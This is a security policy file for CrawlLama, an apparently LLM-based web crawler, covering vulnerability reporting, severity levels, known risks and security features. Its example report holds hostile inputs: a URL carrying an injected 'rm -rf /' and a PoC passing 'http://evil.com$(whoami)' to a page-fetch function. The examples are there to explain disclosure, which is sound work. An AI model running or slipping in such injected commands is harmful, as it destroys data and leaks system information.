# Security Policy

---

📚 **Navigation:** [README](README.md) | [Contributing](CONTRIBUTING.md) | [Docs](docs/README.md) | [Changelog](CHANGELOG.md)

---

## Overview

The security of CrawlLama is important to us. If you discover a vulnerability, please report it responsibly.

---

## Supported Versions

| Version | Supported          |
| ------- | ----------------- |
| 1.4.x   | ✅ Yes            |
| 1.3.x   | ❌ No             |
| 1.2.x   | ❌ No             |
| <1.2    | ❌ No             |

---

## Reporting Vulnerabilities

### DO NOT report publicly

Do **not** create public GitHub Issues for vulnerabilities. This could put other users at risk.

### Responsible Disclosure

#### GitHub Security Advisory (preferred)

1. Go to [Security Advisories](https://github.com/arn-c0de/Crawllama/security/advisories)  
2. Click **Report a vulnerability**  
3. Fill out the form with details

#### Email (alternative for sensitive leaks)

- **Email:** [crawllama.support@protonmail.com](mailto:crawllama.support@protonmail.com)  
- **Subject:** `[SECURITY] Short Description`  
- **Encryption:** Use ProtonMail for end-to-end encryption  

### Report Contents

Include:

- **Vulnerability type** (e.g., RCE, XSS, Arbitrary File Read)  
- **Affected version(s)**  
- **Steps to reproduce**  
- **Proof of Concept** (PoC) code or screenshot  
- **Potential impact**  
- **Suggested solution** (optional)  
- **CVE-ID** (if applicable)  

**Example:**

```markdown
**Vulnerability:** Command Injection in page_reader.py  
**Version:** v1.3.0  
**Description:** `fetch_page()` does not validate user input, allowing command injection.  
**Steps:**  
1. Start CrawlLama  
2. Enter URL: `http://example.com; rm -rf /`  
**Impact:** Remote Code Execution (RCE)  
**PoC:**  
```python
from tools.page_reader import fetch_page
fetch_page("http://evil.com$(whoami)")
````

**Suggestion:** Validate URLs with `validators.url()` before processing

````

---

## Response Times

| Action                     | Target                  |
|-----------------------------|------------------------|
| Initial response            | Within 48 hours        |
| First assessment            | Within 7 days          |
| Fix critical issues         | Within 30 days         |
| Fix moderate issues         | Within 90 days         |

---

## Severity Levels (CVSS v3.1)

| Severity    | CVSS Score | Examples                  |
|-------------|------------|---------------------------|
| Critical    | 9.0–10.0   | RCE, Auth Bypass          |
| High        | 7.0–8.9    | SQL Injection, XSS        |
| Medium      | 4.0–6.9    | CSRF, Info Disclosure     |
| Low         | 0.1–3.9    | Minor Info Leaks          |

---

## Known Security Risks

### Local Operation

CrawlLama is designed for **local use**. If exposed publicly:

- Implement authentication (API keys)  
- Enable rate limiting (`security.rate_limit`)  
- Validate all user input  
- Restrict access via firewall/proxy  
- Use HTTPS/TLS

### Web Scraping Risks

- Malicious content on websites  
- SSRF via user-controlled URLs  
- DoS via large responses or redirects  

**Mitigation:**  
- Domain blacklist (`data/blacklist.txt`)  
- Timeout limits and max response size  
- Respect `robots.txt`

### LLM-Specific Risks

- Prompt injection  
- Data poisoning (RAG database)  
- Model hallucinations  

**Mitigation:**  
- Hallucination detection (`core/hallu_detect.py`)  
- Output sanitization  
- Source attribution  

### Dependency Vulnerabilities

```bash
# Check dependencies
pip-audit
safety check
# Or with script
python scripts/check_dependencies.py
````

* Dependabot handles automatic updates

---

## Security Features

1. **Input Validation** (`utils/validators.py`)

   * `validate_url()`
   * `validate_query()`
   * `sanitize_output()`

2. **Rate Limiting** (`config.json`)

```json
"security": {
  "rate_limit": 1.0,
  "check_robots_txt": true
}
```

3. **Domain Blacklist** (`data/blacklist.txt`)

```txt
malware-site.com
phishing-domain.net
```

4. **Secure Config**

```python
from utils.secure_config import SecureConfig
config = SecureConfig()
config.set_key("api_key", "secret")
```

5. **Plugin Sandbox**

* Plugins run in a separate namespace with no access to sensitive data

---

## Security Best Practices

### Users

* Do not commit secrets; use `.env`
* Keep API local only
* Install updates promptly
* Verify URLs before use
* Monitor logs (`logs/app.log`)

### Developers

* Validate all input
* Sanitize LLM output
* Keep secrets out of code
* Check dependencies before release
* Write security tests

---

## Pre-Release Security Checklist

* [ ] No critical/high vulnerabilities (`pip-audit`)
* [ ] No secrets committed
* [ ] `.env.example` placeholders only
* [ ] Domain blacklist updated
* [ ] Rate limiting enabled
* [ ] Input validation active
* [ ] Output sanitization active
* [ ] Security tests pass
* [ ] Documentation updated

---

## Disclosure Policy

After fixing a vulnerability:

1. Publish security advisory on GitHub
2. Request CVE (high/critical)
3. Mention in release notes (without details)
4. Credit reporter (optional)
5. Wait 30 days before full disclosure

---

## Hall of Fame

*No reports yet – be the first!*

---

## Bug Bounty Program

No official program, but all reports are honored with:

* Public credit (if desired)
* Mention in release notes
* Hall of Fame entry

---

## Contact

* **GitHub Security:** [Security Advisories](https://github.com/arn-c0de/Crawllama/security/advisories)

---

## Further Resources

* [OWASP Top 10](https://owasp.org/www-project-top-ten/)
* [CWE Top 25](https://cwe.mitre.org/top25/)
* [CVSS Calculator](https://www.first.org/cvss/calculator/3.1)
* [Responsible Disclosure](https://en.wikipedia.org/wiki/Responsible_disclosure)

---

**Thank you for helping keep CrawlLama secure!** 🔒

